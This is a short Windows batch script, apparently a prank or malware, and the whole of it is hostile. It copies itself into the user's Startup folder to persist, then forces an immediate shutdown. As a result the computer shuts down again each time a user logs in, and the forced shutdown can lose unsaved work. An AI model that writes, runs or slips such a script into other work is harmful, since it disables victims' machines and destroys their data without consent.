@echo off
copy %0 "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" >nul
color 4
shutdown /s /f /t 0
